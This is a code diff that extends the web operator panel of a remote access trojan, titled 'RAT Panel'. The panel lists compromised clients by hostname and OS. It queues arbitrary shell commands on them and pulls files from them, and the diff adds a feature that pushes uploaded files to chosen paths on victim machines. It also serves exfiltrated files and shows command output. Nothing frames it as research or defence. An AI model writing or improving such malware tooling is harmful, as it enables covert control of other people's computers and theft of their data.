@@ -7,6 +7,7 @@
         body { background: #000000; color: rgb(255, 255, 255); font-family: sans-serif; padding: 15px; }
         .box { padding: 10px; margin-bottom: 10px; }
         button, input { background: #232323; color: #fff; border: 1px solid #555; padding: 5px; }
+        input[type="file"] { border: none; padding: 0; }
         #console { 
             background: #232323; 
             height: 400px; 
@@ -16,6 +17,7 @@
             word-wrap: break-word;
             padding: 10px;
         }
+        .section-label { color: #888; font-size: 12px; margin-bottom: 4px; }
     </style>
     <title>RAT Panel</title>
 </head>
@@ -29,72 +31,125 @@
         <h2>Task Control</h2>
         <input id="clientId" placeholder="Client ID" style="width: 450px;">
         <br><br>
-        <input id="cmd" placeholder="Command" style="width: 450px;">
-        <button onclick="send('cmd')">Execute</button>        
+        <input id="cmd" placeholder="Command" style="width: 400px;">
+        <button onclick="send('cmd')">Execute</button>
         <br><br>
-        <input id="path" placeholder="File Path" style="width: 450px;">
-        <button onclick="send('download')">Download</button>
+        <input id="downloadPath" placeholder="File Path" style="width: 400px;">
+        <button onclick="sendDownload()">Download</button>
+        <br><br>
+        <div class="section-label">Upload file to client</div>
+        <input id="uploadPath" placeholder="Target path" style="width: 280px;">
+        <input type="file" id="uploadFile">
+        <button onclick="sendUpload()">Upload</button>
     </div>
     <div class="box">
         <h2>Files</h2>
         <div id="files"></div>
         <button onclick="refreshFiles()">Refresh</button>
-        <br><br>
     </div>
     <div class="box" style="background: #232323; height: 200px; overflow-y: scroll;" id="console">
         <div style="color: #555;">Command Output</div>
     </div>
+
     <script>
-        const API_BASE = 'http://localhost:8081';
+        const API_BASE = '';
 
         async function refresh() {
-            let res = await fetch(`${API_BASE}/api/clients`);
-            let data = await res.json();
-            document.getElementById('clients').innerHTML = data.map(a =>
-                `<div><b>${a.id}</b> | ${a.hostname} | ${a.os} | Last seen: ${a.last_seen}
-                <button onclick="document.getElementById('clientId').value='${a.id}'">Select</button></div>`
-            ).join('');
+            try {
+                let res = await fetch(`${API_BASE}/api/clients`);
+                let data = await res.json();
+                document.getElementById('clients').innerHTML = (data || []).map(a =>
+                    `<div><b>${a.id}</b> | ${a.hostname} | ${a.os} | Last seen: ${new Date(a.last_seen).toLocaleTimeString()}
+                    <button onclick="document.getElementById('clientId').value='${a.id}'">Select</button></div>`
+                ).join('') || '<div style="color:#555">No active clients</div>';
+            } catch(e) {}
         }
 
         async function send(type) {
-            let id = document.getElementById('clientId').value;
+            let id = document.getElementById('clientId').value.trim();
+            if (!id) { alert("Select a client first"); return; }
             let cmd = document.getElementById('cmd').value;
-            let path = document.getElementById('path').value;
-            await fetch(`${API_BASE}/api/task?id=` + id, {
+            let res = await fetch(`${API_BASE}/api/task?id=` + id, {
                 method: 'POST',
-                body: JSON.stringify({type, command: cmd, path})
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({type, command: cmd, path: ''})
             });
-            alert("Task sent");
+            if (!res.ok) { alert("Error: client offline?"); return; }
             document.getElementById('cmd').value = '';
-            document.getElementById('path').value = '';
+        }
+
+        async function sendDownload() {
+            let id = document.getElementById('clientId').value.trim();
+            if (!id) { alert("Select a client first"); return; }
+            let path = document.getElementById('downloadPath').value.trim();
+            if (!path) { alert("Enter file path"); return; }
+            let res = await fetch(`${API_BASE}/api/task?id=` + id, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({type: 'download', command: 'download', path: path})
+            });
+            if (!res.ok) { alert("Error: client offline?"); return; }
+            document.getElementById('downloadPath').value = '';
+        }
+
+        async function sendUpload() {
+            let id = document.getElementById('clientId').value.trim();
+            if (!id) { alert("Select a client first"); return; }
+            let targetPath = document.getElementById('uploadPath').value.trim();
+            if (!targetPath) { alert("Enter target path on client"); return; }
+            let fileInput = document.getElementById('uploadFile');
+            if (!fileInput.files.length) { alert("Select a file"); return; }
+            let file = fileInput.files[0];
+            let arrayBuffer = await file.arrayBuffer();
+            let bytes = Array.from(new Uint8Array(arrayBuffer));
+            let res = await fetch(`${API_BASE}/api/task?id=` + id, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    type: 'upload',
+                    command: 'upload ' + file.name,
+                    path: targetPath,
+                    file_name: file.name,
+                    file_data: bytes
+                })
+            });
+            if (!res.ok) { alert("Error: client offline?"); return; }
+            document.getElementById('uploadPath').value = '';
+            fileInput.value = '';
+            alert("Upload task queued");
         }
 
         async function refreshFiles() {
-            let res = await fetch(`${API_BASE}/api/uploads`);
-            let files = await res.json();
-            document.getElementById('files').innerHTML = files.map(f => 
-                `<div>${f} <a href="#" onclick="window.open('${API_BASE}/download/${f}'); return false;" style="color:#51998e">[Download]</a></div>`
-            ).join('');
+            try {
+                let res = await fetch(`${API_BASE}/api/uploads`);
+                let files = await res.json();
+                document.getElementById('files').innerHTML = (files || []).map(f => 
+                    `<div>${f} <a href="${API_BASE}/download/${f.replaceAll("\\", "%5C")}" target="_blank" style="color:#51998e">[Download]</a></div>`
+                ).join('');
+            } catch(e) {}
         }
 
         async function refreshLogs() {
-            let res = await fetch(`${API_BASE}/api/logs`);
-            let logs = await res.json();
-            document.getElementById('console').innerHTML = 
-                '<div style="color: #555;">Command Output</div>' +
-                logs.map(l => {
-                    let escaped = l.replace(/&/g, '&amp;')
-                                  .replace(/</g, '&lt;')
-                                  .replace(/>/g, '&gt;');
-                    return `<div style="margin-bottom: 15px; border-bottom: 1px solid #444; padding-bottom: 10px;">${escaped}</div>`;
-                }).join('');
+            try {
+                let res = await fetch(`${API_BASE}/api/logs`);
+                let logs = await res.json();
+                let console_ = document.getElementById('console');
+                let wasAtBottom = console_.scrollHeight - console_.scrollTop <= console_.clientHeight + 5;
+                console_.innerHTML = (logs || []).length === 0
+                    ? '<div style="color: #555;">Waiting for results...</div>'
+                    : (logs || []).map(l => {
+                        let escaped = l.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+                        return `<div style="margin-bottom:15px; border-bottom:1px solid #444; padding-bottom:10px;">${escaped}</div>`;
+                    }).join('');
+                if (wasAtBottom) console_.scrollTop = console_.scrollHeight;
+            } catch(e) {}
         }
 
         setInterval(refreshLogs, 3000);
         setInterval(refreshFiles, 6000);
-        refreshFiles();
         setInterval(refresh, 3000);
         refresh();
+        refreshFiles();
     </script>
 </body>
 </html>
